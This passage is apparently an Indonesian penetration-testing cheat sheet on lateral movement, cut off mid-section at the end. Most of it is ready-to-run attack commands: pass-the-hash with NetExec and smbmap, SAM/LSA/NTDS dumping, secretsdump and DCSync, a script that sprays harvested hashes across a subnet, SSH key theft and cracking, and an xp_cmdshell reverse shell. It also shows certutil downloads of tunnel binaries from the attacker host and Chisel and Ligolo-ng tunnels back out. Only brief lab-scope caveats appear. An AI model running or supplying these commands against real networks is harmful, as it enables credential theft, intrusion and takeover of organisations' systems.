> **Catatan Kompatibilitas `smbclient`**: Flag `--pw-nt-hash` tidak tersedia di semua versi native `smbclient`. Jika versi lokal Anda mengembalikan error flag invalid, gunakan sintaks: `smbclient "//$TARGET_IP/C$" -U "$USERNAME%NTHASH" --pw-nt-hash` atau gunakan Impacket wrapper `python3 /opt/impacket/examples/smbclient.py "$DOMAIN/$USERNAME@$TARGET_IP" -hashes ":NTHASH"`.

---

# 7.2.1 🧰 Commands di smbclient

```text
ls
    → list files

cd directory
    → change directory

pwd
    → show current directory

get file.txt
    → download

put file.txt
    → upload

mget *.txt
    → download multiple

exit
    → keluar
```

---

# 7.3 🗂️ Mount SMB Share

```bash
# Create mount point
sudo mkdir -p /mnt/smb

# Mount the share
sudo mount -t cifs \
    "//$TARGET_IP/C$" \
    /mnt/smb \
    -o "username=$USERNAME,password=$PASSWORD,domain=$DOMAIN"
```

Browse:

```bash
# Browse mounted share
ls -la /mnt/smb
```

Unmount:

```bash
# Cleanly unmount
sudo umount /mnt/smb
```

---

# 7.3.1 🔐 Kerberos SMB Mount

Pada environment yang mendukung Kerberos:

```bash
# Use Kerberos ticket
sudo mount -t cifs \
    "//$TARGET_HOSTNAME/C$" \
    /mnt/smb \
    -o "sec=krb5,cruid=$(id -u),vers=3.0"
```

> Kerberos SMB lebih sensitif terhadap hostname/SPN daripada password-based SMB.

---

# 7.4 📊 smbmap

```bash
# Show share permissions
smbmap \
    -u "$USERNAME" \
    -p "$PASSWORD" \
    -d "$DOMAIN" \
    -H "$TARGET_IP"
```

Dengan hash:

```bash
# Hash-authenticated smbmap (Format LM:NT — Paling reliable)
smbmap \
    -u "$USERNAME" \
    -p "aad3b435b51404eeaad3b435b51404ee:ACTUAL_NT_HASH" \
    -d "$DOMAIN" \
    -H "$TARGET_IP"

# Opsi alternatif: Langsung sertakan NT Hash saja (Tergantung versi smbmap lokal)
smbmap \
    -u "$USERNAME" \
    -p "ACTUAL_NT_HASH" \
    -d "$DOMAIN" \
    -H "$TARGET_IP"
```

> **Tips**: `smbmap` secara tradisional membutuhkan titik dua `:`. Jika menggunakan format `LM:NT`, gunakan blank LM hash `aad3b435b51404eeaad3b435b51404ee` diikuti oleh NT Hash aktual Anda. Selalu periksa `smbmap --help` untuk detail versi lokal.

Recursive listing:

```bash
# List files under a share/path
smbmap \
    -u "$USERNAME" \
    -p "$PASSWORD" \
    -H "$TARGET_IP" \
    -r "C$\Users"
```

---

# 🧰 8. NETEXEC SEBAGAI SWISS ARMY KNIFE

## 8.1 📊 Commands Penting

|Tujuan|Command|
|---|---|
|Validasi password SMB|`netexec smb $TARGET_IP -u $USERNAME -p $PASSWORD`|
|Validasi hash SMB|`netexec smb $TARGET_IP -u $USERNAME -H NTHASH`|
|Spray/validate subnet|`netexec smb 10.10.10.0/24 -u $USERNAME -H NTHASH --no-bruteforce`|
|Execute CMD|`netexec smb $TARGET_IP -u $USERNAME -H NTHASH -x "whoami"`|
|Execute PowerShell|`netexec smb $TARGET_IP -u $USERNAME -H NTHASH -X "Get-Process"`|
|Dump SAM|`netexec smb $TARGET_IP -u $USERNAME -H NTHASH --sam`|
|Dump LSA|`netexec smb $TARGET_IP -u $USERNAME -H NTHASH --lsa`|
|List shares|`netexec smb $TARGET_IP -u $USERNAME -H NTHASH --shares`|
|Spider shares|`netexec smb $TARGET_IP -u $USERNAME -H NTHASH --spider C$`|
|WinRM check|`netexec winrm $TARGET_IP -u $USERNAME -H NTHASH`|
|MSSQL check|`netexec mssql $TARGET_IP -u $USERNAME -p $PASSWORD`|

---

# 8.1.1 🚨 Validasi Selalu Pertama

Muscle memory:

```text
Credential obtained
       │
       ▼
NETEXEC
       │
       ▼
Where is it valid?
```

Bukan:

```text
Credential obtained
       │
       ▼
psexec langsung
```

---

# 8.2 ⚡ NetExec Command Execution

CMD:

```bash
# Run a CMD command
netexec smb "$TARGET_IP" \
    -u "$USERNAME" \
    -H "NTHASH" \
    -x "whoami /all"
```

PowerShell:

```bash
# Run a PowerShell command
netexec smb "$TARGET_IP" \
    -u "$USERNAME" \
    -H "NTHASH" \
    -X "Get-LocalUser"
```

Subnet:

```bash
# Run a low-impact identity check across known lab hosts
netexec smb 10.10.10.0/24 \
    -u "$USERNAME" \
    -H "NTHASH" \
    -x "whoami"
```

---

# 8.3 🧬 NetExec Credential Dumping

SAM:

```bash
# Dump local SAM database
netexec smb "$TARGET_IP" \
    -u "$USERNAME" \
    -H "NTHASH" \
    --sam
```

LSA:

```bash
# Dump LSA secrets where privileges allow
netexec smb "$TARGET_IP" \
    -u "$USERNAME" \
    -H "NTHASH" \
    --lsa
```

NTDS:

```bash
# Domain Controller only: dump domain directory hashes
netexec smb "$DC_IP" \
    -u "$USERNAME" \
    -H "NTHASH" \
    --ntds
```

> `--ntds` adalah operasi highly privileged dan target-specific. Jangan menganggap local admin pada ordinary workstation cukup untuk dump NTDS.

---

# 8.3.1 🧠 SAM vs NTDS

```text
SAM
 │
 └── local accounts
```

```text
NTDS.dit
 │
 └── domain accounts
```

Jadi:

```text
FILE01
 └── SAM

DC01
 └── NTDS
```

---

# 8.3.2 🧪 Mimikatz Module

Jika module tersedia dan lab mengizinkannya:

```bash
# Use NetExec's Mimikatz module where supported
netexec smb "$TARGET_IP" \
    -u "$USERNAME" \
    -H "NTHASH" \
    -M mimikatz
```

EDR/AV dapat memblokir teknik ini.

---

# 🔓 9. SECRETSDUMP — CREDENTIAL HARVESTING

## 9.1 🧰 secretsdump.py

Password:

```bash
# Dump local/domain credential material as allowed
python3 /opt/impacket/examples/secretsdump.py \
    "$DOMAIN/$USERNAME:$PASSWORD@$TARGET_IP"
```

Hash:

```bash
# Authenticate with NT hash
python3 /opt/impacket/examples/secretsdump.py \
    -hashes "$NT_HASH" \
    "$DOMAIN/$USERNAME@$TARGET_IP"
```

Kerberos:

```bash
# Use existing Kerberos cache
python3 /opt/impacket/examples/secretsdump.py \
    -k \
    -no-pass \
    "$DOMAIN/$USERNAME@$TARGET_HOSTNAME"
```

---

# 9.1.1 🧠 Apa yang Dicari secretsdump?

Pada host biasa:

```text
SAM
LSA
cached credentials
```

Pada DC:

```text
NTDS
domain credential material
```

---

# 9.2 📊 Analisis Output

Contoh:

```text
[*] Dumping local SAM hashes
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:...
```

Format:

```text
username:RID:LM_hash:NT_hash:::
```

Contoh:

```text
Administrator
    │
    ├── RID = 500
    ├── LM hash
    └── NT hash
```

---

# 9.2.1 🔑 Mana yang Dipakai untuk PTH?

Ambil:

```text
NT_hash
```

Contoh:

```text
31d6cfe0d16ae931b73c59d7e0c089c0
```

Jika tool membutuhkan LM:NT:

```text
aad3b435b51404eeaad3b435b51404ee:
31d6cfe0d16ae931b73c59d7e0c089c0
```

---

# 9.2.2 ⚠️ `aad3b435...` Bukan Berarti Password Kosong

Nilai tersebut umum sebagai LM placeholder untuk account Windows modern.

Jangan salah membaca:

```text
LM = aad3...
```

sebagai:

```text
password = empty
```

Password empty hash yang umum:

```text
31d6cfe0d16ae931b73c59d7e0c089c0
```

adalah hal berbeda.

---

# 9.2.3 📄 Extract NT Hash

Misalkan output disimpan:

```text
secretsdump_output.txt
```

Gunakan parsing yang hati-hati:

```bash
# Extract 32-hex NT-hash fields from standard secretsdump-style lines
grep -E ':::[[:alnum:]]{32}:::$' secretsdump_output.txt
```

---

## 9.2.4 🔄 Otomatisasi Handling & Spraying Multiple Hashes

Setelah menjalankan `secretsdump.py` dan mendapatkan puluhan NT hash, berikut adalah workflow otomatis untuk mengekstrak dan melakukan credential spray ke seluruh subnet:

```bash
# 1. Jalankan secretsdump dan simpan output ke file loot
python3 /opt/impacket/examples/secretsdump.py \
    -hashes "$NT_HASH" \
    "$DOMAIN/$USERNAME@$TARGET_IP" \
    | tee lateral/loot/secretsdump_TARGET.txt

# 2. Extract format USERNAME:NTHASH yang valid
grep ":::" lateral/loot/secretsdump_TARGET.txt \
    | grep -v "^#" \
    | awk -F: '{print $1":"$4}' \
    | grep -v ":$" \
    > lateral/loot/hashes_for_spray.txt

# Inspect daftar hash yang berhasil diekstrak
cat lateral/loot/hashes_for_spray.txt

# 3. Spray seluruh pasangan User:Hash ke subnet menggunakan NetExec
while IFS=: read -r user hash; do
    [ -z "$user" ] || [ -z "$hash" ] && continue
    echo "[*] Testing user: $user"
    netexec smb 10.10.10.0/24 \
        -u "$user" \
        -H "aad3b435b51404eeaad3b435b51404ee:$hash" \
        --no-bruteforce 2>/dev/null \
        | grep -E "Pwn3d|\+\s"
done < lateral/loot/hashes_for_spray.txt
```

---

# 9.3 🔄 DCSync

DCSync meminta domain controller memberikan credential material melalui directory replication.

Prerequisite:

```text
DS-Replication-Get-Changes
+
DS-Replication-Get-Changes-All
```

Contoh lab:

```bash
# Request domain credential replication data
python3 /opt/impacket/examples/secretsdump.py \
    -just-dc \
    "$DOMAIN/$USERNAME:$PASSWORD@$DC_IP"
```

Hash:

```bash
# DCSync using NT hash
python3 /opt/impacket/examples/secretsdump.py \
    -just-dc \
    -hashes "$NT_HASH" \
    "$DOMAIN/$USERNAME@$DC_IP"
```

Specific user:

```bash
# Request one user's directory credential data
python3 /opt/impacket/examples/secretsdump.py \
    -just-dc-user "administrator" \
    "$DOMAIN/$USERNAME:$PASSWORD@$DC_IP"
```

---

# 9.3.1 🧠 DCSync Bukan "Login ke Database"

DCSync:

```text
Attacker
   │
   │ Directory Replication Request
   ▼
Domain Controller
   │
   ▼
Credential Material
```

Bukan:

```text
Attacker
  │
  └── copies NTDS.dit file directly
```

---

# 🐧 10. SSH LATERAL MOVEMENT

## 10.1 🔑 SSH dengan Password

```bash
# SSH to target
ssh "$USERNAME@$TARGET_IP"
```

Lab-only:

```bash
# Disable strict host checking for disposable labs
ssh \
    -o StrictHostKeyChecking=no \
    "$USERNAME@$TARGET_IP"
```

Non-standard port:

```bash
# Connect to SSH on custom port
ssh \
    -p 2222 \
    "$USERNAME@$TARGET_IP"
```

---

# 10.2 🗝️ SSH dengan Private Key

```bash
# Use a private SSH key
ssh \
    -i "id_rsa" \
    "$USERNAME@$TARGET_IP"
```

Fix permissions:

```bash
# Private key should normally not be group/world-readable
chmod 600 "id_rsa"
```

Kemudian:

```bash
# Connect again
ssh \
    -i "id_rsa" \
    "$USERNAME@$TARGET_IP"
```

---

# 10.2.1 🔍 Cari SSH Key di Linux Target

Setelah mendapatkan shell:

```bash
# Search for RSA private keys
find / \
    -name "id_rsa" \
    2>/dev/null

# Search PEM files
find / \
    -name "*.pem" \
    2>/dev/null

# Search authorized_keys files
find / \
    -name "authorized_keys" \
    2>/dev/null
```

Common locations:

```text
/home/user/.ssh/id_rsa
/home/user/.ssh/authorized_keys
/root/.ssh/id_rsa
```

---

# 10.3 🧭 SSH Key Cracking

Jika key memiliki passphrase:

```bash
# Convert OpenSSH private key to John format
ssh2john "id_rsa" > "id_rsa.hash"
```

Crack:

```bash
# Use John against the extracted key hash
john \
    "id_rsa.hash" \
    --wordlist="/usr/share/wordlists/rockyou.txt"
```

Hashcat:

```bash
# Example modern OpenSSH hashcat mode
hashcat \
    -m 22921 \
    "id_rsa.hash" \
    "/usr/share/wordlists/rockyou.txt"
```

> Hashcat mode bergantung pada key format. Pastikan hash mode cocok dengan output `ssh2john`.

---

# 🧮 11. MSSQL LATERAL MOVEMENT

## 11.1 🗄️ Akses MSSQL

Password:

```bash
# Connect using Windows authentication
python3 /opt/impacket/examples/mssqlclient.py \
    "$DOMAIN/$USERNAME:$PASSWORD@$TARGET_IP" \
    -windows-auth
```

Hash:

```bash
# Authenticate using NT hash where supported
python3 /opt/impacket/examples/mssqlclient.py \
    -hashes "$NT_HASH" \
    "$DOMAIN/$USERNAME@$TARGET_IP" \
    -windows-auth
```

---

# 11.1.1 ✅ Validate MSSQL First

```bash
# Check MSSQL service
netexec mssql "$TARGET_IP" \
    -u "$USERNAME" \
    -p "$PASSWORD"
```

Jika:

```text
[+] domain\user
```

maka credential diterima oleh MSSQL.

---

# 11.2 💻 xp_cmdshell

Jika account memiliki privilege yang diperlukan:

```sql
-- Check current SQL identity
SELECT SYSTEM_USER;

-- Check whether xp_cmdshell is enabled
EXEC sp_configure 'xp_cmdshell';
```

Pada controlled lab:

```sql
-- Enable advanced options
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;

-- Enable xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

Execute:

```sql
-- Execute Windows command
EXEC xp_cmdshell 'whoami';
```

Contoh:

```text
nt service\mssqlserver
```

---

# 11.2.1 ⚠️ xp_cmdshell = Authorization Issue

Jangan mengasumsikan:

```text
MSSQL login
     =
OS command execution
```

Biasanya memerlukan:

```text
sysadmin
+
xp_cmdshell enabled
```

---

# 11.2.2 🧨 Reverse Shell

Dalam CTF/lab:

```sql
-- Example concept:
-- xp_cmdshell → PowerShell → callback
EXEC xp_cmdshell 'powershell -e BASE64_PAYLOAD';
```

> Hanya gunakan callback/reverse shell pada lab atau target yang memang berada dalam scope.

---

# 11.3 🔗 MSSQL Linked Servers

Cek:

```sql
-- List linked SQL servers
SELECT name, is_linked
FROM sys.servers;
```

Contoh:

```text
name             is_linked
---------------- ---------
SQL01             0
SQL02             1
REPORTING         1
```

Konsep:

```text
SQL01
  │
  │ linked server
  ▼
SQL02
```

Potential pivot:

```sql
-- Execute SQL on a linked server
EXEC ('SELECT @@SERVERNAME') AT [SQL02];
```

Jika account memiliki privilege yang cukup dan feature tersedia:

```sql
-- Example command execution on linked target
EXEC ('EXEC xp_cmdshell ''whoami''') AT [SQL02];
```

---

# 🔎 12. CREDENTIAL COLLECTION DI TARGET

Setelah mendapatkan host baru:

> **Jangan langsung berpindah lagi.**

Lakukan enumeration lokal terlebih dahulu.

Mental model:

```text
NEW HOST
   │
   ├── Who am I?
   ├── What privileges?
   ├── What credentials?
   ├── What files?
   ├── What sessions?
   └── What services?
```

---

# 12.1 🪟 WINDOWS TARGET

## Remote Enumeration

```bash
# Dump SAM where authorized
netexec smb "$TARGET_IP" \
    -u "$USERNAME" \
    -H "NTHASH" \
    --sam
```

```bash
# Dump LSA secrets where authorized
netexec smb "$TARGET_IP" \
    -u "$USERNAME" \
    -H "NTHASH" \
    --lsa
```

File discovery:

```bash
# Search readable files with common credential extensions
netexec smb "$TARGET_IP" \
    -u "$USERNAME" \
    -H "NTHASH" \
    --spider C$ \
    --pattern "*.txt,*.xml,*.config,*.ini"
```

PowerShell history:

```bash
# Inspect PowerShell history where permissions allow
netexec smb "$TARGET_IP" \
    -u "$USERNAME" \
    -H "NTHASH" \
    -x "type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
```

Credential Manager:

```bash
# List credential manager entries
netexec smb "$TARGET_IP" \
    -u "$USERNAME" \
    -H "NTHASH" \
    -x "cmdkey /list"
```

---

# 12.1.1 🔎 Local Windows Checklist

```text
[ ] whoami
[ ] whoami /all
[ ] hostname
[ ] ipconfig /all
[ ] route print
[ ] net user
[ ] net localgroup administrators
[ ] cmdkey /list
[ ] PowerShell history
[ ] application configuration
[ ] credential files
[ ] scheduled tasks
[ ] services
[ ] logged-on users
[ ] SMB shares
```

Contoh:

```powershell
# Current identity
whoami /all

# Current hostname
hostname

# Network configuration
ipconfig /all

# Local Administrators group
net localgroup administrators

# Stored credential references
cmdkey /list

# Logged-on users
query user
```

---

# 🐧 12.2 LINUX TARGET

Bash history:

```bash
# Current user's shell history
cat ~/.bash_history

# Search common home directories
cat /home/*/.bash_history 2>/dev/null
```

Credential files:

```bash
# Find application configuration files
find / \
    -name "*.conf" \
    2>/dev/null

# Search for wp-config.php
find / \
    -name "wp-config.php" \
    2>/dev/null

# Search .env files
find / \
    -name ".env" \
    2>/dev/null
```

SSH:

```bash
# Find private SSH keys
find / \
    -name "id_rsa" \
    2>/dev/null
```

Database:

```bash
# Search common database credential files
find / \
    -name "database.yml" \
    -o -name "db_config*" \
    2>/dev/null
```

Web application:

```bash
# Search for password references in an application directory
grep -Rni \
    "password" \
    /var/www/ \
    2>/dev/null
```

---

# 12.2.1 🧠 Linux Credential Hunt

```text
LINUX HOST
   │
   ├── ~/.bash_history
   ├── ~/.ssh/
   ├── /var/www/
   ├── .env
   ├── *.conf
   ├── database.yml
   ├── service configs
   └── application source
```

---

# 🌳 13. DECISION TREE LATERAL MOVEMENT

```text
                 ┌────────────────────────┐
                 │ CREDENTIAL OBTAINED    │
                 └───────────┬────────────┘
                             │
              ┌──────────────┼──────────────┐
              │              │              │
              ▼              ▼              ▼
           NT HASH        PASSWORD         TICKET
              │              │              │
              └──────┬───────┘              │
                     ▼                      ▼
              NETEXEC VALIDATION       KERBEROS TARGET
                     │                      │
                     ▼                      ▼
                10.10.10.0/24          HOSTNAME/SPN
                     │                      │
          ┌──────────┼──────────┐           ▼
          │          │          │        PTT
          ▼          ▼          ▼           │
        Pwn3d      [+] User    [-]          ▼
          │          │        Failed      Remote Access
          │          │          │
          ▼          ▼          ▼
       EXECUTE     ENUM      Try another
       │            │        credential
       │            │
 ┌─────┼─────┐      │
 ▼     ▼     ▼      ▼
445   5985  3389  More Enum
 │      │     │
 ▼      ▼     ▼
SMB   WinRM  RDP
```

---

# 13.1 🔑 Jika Hanya Punya NT Hash

```text
NT HASH
   │
   ▼
NetExec
   │
   ▼
Credential Validation
   │
 ┌─┴─────────────────────────────┐
 ▼                               ▼
(Pwn3d!)                      [+] user
 │                               │
 ▼                               ▼
Remote execution               Enumerate
 │                               │
 ├── psexec                     ├── shares
 ├── wmiexec                    ├── WinRM
 ├── smbexec                    ├── RDP
 └── secretsdump                └── other hosts
```

---

# 13.2 🎟️ Jika Punya Kerberos TGT

```text
TGT
 │
 ▼
klist
 │
 ▼
Valid?
 │
 ┌─┴──────┐
 YES      NO
 │         │
 ▼         ▼
Hostname  getTGT again
+ SPN
 │
 ▼
Request/use TGS
 │
 ▼
SMB/WMI/etc.
```

---

# 13.3 🗝️ Jika Punya SSH Key

```text
SSH KEY
   │
   ▼
Does target have SSH?
   │
 ┌─┴───────┐
 YES       NO
 │          │
 ▼          ▼
SSH        Search
 │         another
 ▼         protocol
new shell
```

---

# 13.4 🐧 Jika Environment Linux

```text
Linux host
    │
    ▼
whoami
    │
    ▼
sudo -l
    │
    ▼
credentials
    │
    ├── SSH keys
    ├── .env
    ├── config files
    ├── history
    └── application secrets
    │
    ▼
credential reuse
    │
    ▼
SSH / SMB / DB / API
```

---

# 🧭 13.5 FULL LATERAL DECISION TREE

```text
                           START
                             │
                             ▼
                   [WHAT CREDENTIAL?]
                             │
         ┌───────────────────┼────────────────────┐
         │                   │                    │
         ▼                   ▼                    ▼
       PASSWORD           NT HASH               TGT
         │                   │                    │
         └────────┬──────────┘                    │
                  ▼                               ▼
             NETEXEC                        klist / SPN
                  │                               │
                  ▼                               ▼
          VALID ON HOST?                   TARGET HOSTNAME?
                  │                               │
          ┌───────┴──────┐                 ┌──────┴─────┐
          ▼              ▼                 ▼            ▼
         YES             NO               YES           NO
          │               │                │             │
          ▼               ▼                ▼             ▼
       ADMIN?         Try next host       PTT          DNS/hosts
          │
      ┌───┴────┐
      ▼        ▼
     YES       NO
      │        │
      ▼        ▼
  REMOTE     ENUM
  EXEC       FIRST
      │
 ┌────┼────────────┐
 ▼    ▼            ▼
SMB  WinRM        RDP
 │     │            │
 ▼     ▼            ▼
psexec evil-winrm xfreerdp
```

---

# 🛰️ 14. PIVOTING

## 14.1 🕳️ Kapan Butuh Pivoting?

Pivoting dibutuhkan ketika:

```text
Parrot
  │
  X
  │
Internal Target
```

Target tidak bisa dicapai langsung.

Tetapi:

```text
Parrot
  │
  ▼
Pivot Host
  │
  ▼
Internal Target
```

Contoh:

```text
                    INTERNAL NETWORK
              ┌─────────────────────────┐
              │                         │
Parrot ───► PIVOT01 ───────────────► DC2
              │                         │
              └────────────────────► SQL02
```

---

# 14.1.1 🔎 Tanda Bahwa Kamu Butuh Pivot

```text
[ ] Nmap tidak reach internal subnet
[ ] route ke internal target tidak ada
[ ] target hanya accessible dari compromised host
[ ] private RFC1918 network
[ ] firewall segmentation
[ ] jump host architecture
```

---

# 14.2 🔗 SSH Local Port Forwarding

Misalnya:

```text
Parrot
  │
  │ SSH
  ▼
PIVOT01
  │
  ▼
10.10.10.50:3389
```

Command:

```bash
# Forward local port 3390 to internal RDP service
ssh \
    -L 3390:10.10.10.50:3389 \
    "$USERNAME@$PIVOT_HOST"
```

Sekarang:

```text
Parrot:127.0.0.1:3390
        │
        ▼
      SSH
        │
        ▼
    Pivot Host
        │
        ▼
10.10.10.50:3389
```

Connect:

```bash
# Access internal RDP through the tunnel
xfreerdp \
    /v:127.0.0.1:3390 \
    /u:"$USERNAME" \
    /p:"$PASSWORD"
```

---

# 14.2.1 🧦 Dynamic Port Forwarding / SOCKS

```bash
# Create SOCKS proxy through pivot host
ssh \
    -D 1080 \
    "$USERNAME@$PIVOT_HOST"
```

Configure ProxyChains:

```bash
# Add SOCKS5 proxy to proxychains configuration
echo "socks5 127.0.0.1 1080" |
    sudo tee -a /etc/proxychains4.conf
```

Then:

```bash
# Example TCP-based SMB enumeration through proxy
proxychains \
    netexec smb 10.10.10.50 \
    -u "$USERNAME" \
    -p "$PASSWORD"
```

> Tidak semua tool/protocol bekerja baik melalui SOCKS/proxychains. Tool yang membutuhkan raw packets atau complex UDP traffic sering membutuhkan pendekatan berbeda.

---

# 14.3 🦎 Chisel

## 📥 14.3.0 Cara Transfer Binary `chisel.exe` ke Target Windows

Sebelum menjalankan `chisel client`, Anda perlu mentransfer executable `chisel.exe` ke machine target Windows. Pilih salah satu metode di bawah ini:

### Method 1 — Transfer via HTTP Server (Paling Umum)
```bash
# Di Parrot OS (Host Attacker) — Serve chisel binary
cd /opt/chisel/
python3 -m http.server 8080
```
```cmd
:: Di Target Windows (via CMD / Shell)
certutil -urlcache -split -f "http://%LHOST%:8080/chisel.exe" "C:\Windows\Temp\chisel.exe"
```
```powershell
# Atau di Target Windows (via PowerShell)
Invoke-WebRequest -Uri "http://$env:LHOST:8080/chisel.exe" -OutFile "C:\Windows\Temp\chisel.exe"
```

### Method 2 — Transfer via SMB Server
```bash
# Di Parrot OS
python3 /opt/impacket/examples/smbserver.py share /opt/chisel/ -smb2support
```
```cmd
:: Di Target Windows
copy \\%LHOST%\share\chisel.exe C:\Windows\Temp\chisel.exe
```

### Method 3 — Transfer via Evil-WinRM Upload
```text
:: Di dalam interactive shell Evil-WinRM
*Evil-WinRM* PS C:\> upload /opt/chisel/chisel.exe C:\Windows\Temp\chisel.exe
```

---

## Parrot — Server

```bash
# Start Chisel reverse-capable server
./chisel server \
    --reverse \
    --port 8000
```

Target Windows:

```powershell
# Connect target back to attacker (Jalankan binary dari Temp)
C:\Windows\Temp\chisel.exe client `
    "$LHOST`:8000" `
    R:socks
```

Target Linux:

```bash
# Linux client
./chisel client \
    "$LHOST:8000" \
    R:socks
```

Concept:

```text
Internal Host
     │
     │ outbound connection
     ▼
  Chisel
     │
     ▼
 Parrot
     │
     ▼
 SOCKS
```

---

# 14.3.1 ⚠️ Chisel Direction

Kata:

```text
R:socks
```

berarti reverse tunnel semantics.

Visual:

```text
INTERNAL
   │
   │ outbound
   ▼
ATTACKER
   │
   ▼
SOCKS
```

---

# 14.4 🐺 Ligolo-ng

Ligolo-ng memberikan routed tunnel model yang sering lebih nyaman daripada SOCKS untuk internal network assessment.

---

## 14.4.1 Parrot TUN Setup

```bash
# Create TUN interface for Ligolo-ng
sudo ip tuntap add user "$USER" mode tun ligolo

# Bring interface up
sudo ip link set ligolo up
```

---

## 14.4.2 Start Proxy

```bash
# Start Ligolo-ng proxy
sudo ./proxy \
    -selfcert
```

---

## 14.4.3 Windows Agent

```powershell
# Connect agent to attacker
.\agent.exe `
    -connect "$LHOST`:11601" `
    -ignore-cert
```

Linux:

```bash
# Linux agent
./agent \
    -connect "$LHOST:11601" \
    -ignore-cert
```

---

## 14.4.4 Ligolo-ng Console

Setelah agent connect:

```text
session
```

Pilih session.

Kemudian:

```text
ifconfig
```

untuk melihat network interfaces.

Kemudian:

```text
start
```

untuk memulai tunnel.

---

## 14.4.5 Add Route

```bash
# Route internal subnet through Ligolo interface
sudo ip route add 10.10.10.0/24 \
    dev ligolo
```

Sekarang:

```bash
# Test internal target
nmap \
    -sT \
    -p 80,443,445 \
    10.10.10.50
```

---

# 14.4.6 🧠 SSH vs Chisel vs Ligolo-ng

|Teknik|Model|Kelebihan|Kekurangan|
|---|---|---|---|
|SSH `-L`|Port forward|Sangat sederhana|Satu service/port per tunnel|
|SSH `-D`|SOCKS|Fleksibel|Tool compatibility|
|Chisel|SOCKS/reverse tunnel|Mudah untuk pivot|Agent/server harus tersedia|
|Ligolo-ng|Routed tunnel|Sangat nyaman untuk subnet|Setup lebih kompleks|

---

# 🧯 15. COMMON ERRORS & TROUBLESHOOTING

|Error|Penyebab|Solusi|
|---|---|---|
|`STATUS_LOGON_FAILURE`|Credential/hash salah atau target menolak logon|Validasi dengan NetExec|
|`KDC_ERR_SKEW`|Clock skew|Sync waktu dengan DC|
|`Clock skew too great`|Waktu attacker/DC berbeda|`ntpdate`, NTP, atau cek `timedatectl`|
|`Cannot connect to SMB` walau port open|SMB negotiation/signing/firewall/service issue|Check NetExec + SMB dialect + logs|
|psexec `Access Denied` meski `(Pwn3d!)`|Authorization mismatch/service restriction|Verify exact target/identity/service permissions|
|Evil-WinRM `InvalidOperation`|WinRM/session/argument issue|Recheck port, auth, version, listener|
|xfreerdp connection reset|NLA/TLS/network/session policy|Test 3389, inspect NLA and server policy|
|`NT_STATUS_ACCESS_DENIED` saat share|User authenticated tetapi share/NTFS denies access|Check share + NTFS permissions|
|secretsdump `connection refused`|SMB/RPC unreachable|Check ports 445/135 and firewall|
|Kerberos `Ticket expired`|TGT/TGS sudah expired|Request fresh ticket|
|MSSQL `Login failed`|SQL auth rejected|Check Windows Auth, account permissions|
|SSH `Connection reset by peer`|SSH daemon/network/security policy|Check port 22 and sshd logs|
|WMI `Access denied`|Insufficient WMI/DCOM rights|Validate target permissions|
|DCOM error|Object unavailable / DCOM policy|Try another object / check DCOM|
|ProxyChains tidak route|SOCKS mismatch / UDP / DNS|Check proxy config and use TCP-compatible tools|
|`KRB_AP_ERR_S_PRINCIPAL_UNKNOWN`|SPN/hostname mismatch|Use correct FQDN/SPN|
|`KRB_AP_ERR_MODIFIED`|SPN duplicate/mismatched key|Inspect SPN configuration|
|`KRB5CCNAME` ignored|Variable points to wrong file|`echo $KRB5CCNAME; klist`|
|PTH works on one host but not another|Different privileges/policy|Validate each target separately|
|WinRM port open but auth fails|WinRM auth policy|Check Negotiate/Kerberos/NTLM|
|RDP auth fails with valid password|No RDP logon rights/NLA|Check local groups/policy|
|SMB share appears but cannot write|Read-only share/NTFS ACL|Check permissions|
|`rpc_s_access_denied`|RPC action not authorized|Verify local admin/remote management rights|
|Chisel connects but no traffic|Wrong route/SOCKS setup|Verify tunnel and proxy configuration|
|Ligolo agent connected but target unreachable|Missing route/interface|`ip route`, `ifconfig`, route internal subnet|
|`Permission denied` SSH key|Key permissions too broad|`chmod 600 id_rsa`|
|SSH private key prompts password|Key encrypted with passphrase|Recover/passphrase crack in lab|
|NetExec says host admin but psexec fails|Different execution path requirements|Try WMI/SMBexec and inspect service restrictions|
|`STATUS_BAD_NETWORK_NAME`|Share does not exist|Re-run `--shares`|
|SMB signing blocks operation|Target enforces signing|Use authenticated SMB path that complies or another protocol|

---

# 15.1 🔴 `STATUS_LOGON_FAILURE`

Pertanyaan pertama:

```text
Apakah credential valid?
```

Test:

```bash
netexec smb "$TARGET_IP" \
    -u "$USERNAME" \
    -H "NTHASH"
```

Jika:

```text
[-]
```

jangan langsung menyimpulkan hash rusak.

Mungkin:

```text
wrong username
wrong domain
account disabled
account expired
target-specific policy
NTLM disabled
```

---

# 15.2 ⏰ Kerberos Clock Error

Flow troubleshooting:

```text
Kerberos failed
     │
     ▼
date
     │
     ▼
timedatectl
     │
     ▼
sync with DC
     │
     ▼
klist
     │
     ▼
fresh TGT
```

---

# 15.3 🔐 "Cannot Connect to SMB" Padahal 445 Open

Port open hanya berarti:

```text
TCP 445 reachable
```

Bukan:

```text
SMB authentication succeeds
```

Check:

```bash
# SMB protocol and authentication
netexec smb "$TARGET_IP"
```

Kemudian:

```bash
# More direct port check
nmap \
    -p 445 \
    -sV \
    "$TARGET_IP"
```

---

# 15.4 💥 psexec Access Denied

Jika NetExec:

```text
(Pwn3d!)
```

tetapi psexec:

```text
ACCESS_DENIED
```

jangan langsung menyimpulkan contradiction.

Periksa:

```text
1. target IP/hostname
2. exact credential
3. administrative shares
4. service creation policy
5. UAC/remote restrictions
6. EDR/AV
```

Coba:

```bash
# Check administrative shares
netexec smb "$TARGET_IP" \
    -u "$USERNAME" \
    -H "NTHASH" \
    --shares
```

Kemudian WMI:

```bash
# Alternative execution path
python3 /opt/impacket/examples/wmiexec.py \
    -hashes "$NT_HASH" \
    "$DOMAIN/$USERNAME@$TARGET_IP"
```

---

# 15.5 🎫 Kerberos Ticket Expired

```bash
# Check current cache
klist
```

Jika expired:

```bash
# Get fresh TGT
python3 /opt/impacket/examples/getTGT.py \
    "$DOMAIN/$USERNAME:$PASSWORD" \
    -dc-ip "$DC_IP"
```

Reload:

```bash
export KRB5CCNAME="$PWD/$USERNAME.ccache"
klist
```

---

# 15.6 🛜 ProxyChains Tidak Route

Check:

```bash
# Verify the SOCKS listener exists
sudo ss -ltnp | grep 1080
```

Check:

```bash
# Verify proxychains configuration
tail -n 5 /etc/proxychains4.conf
```

Test:

```bash
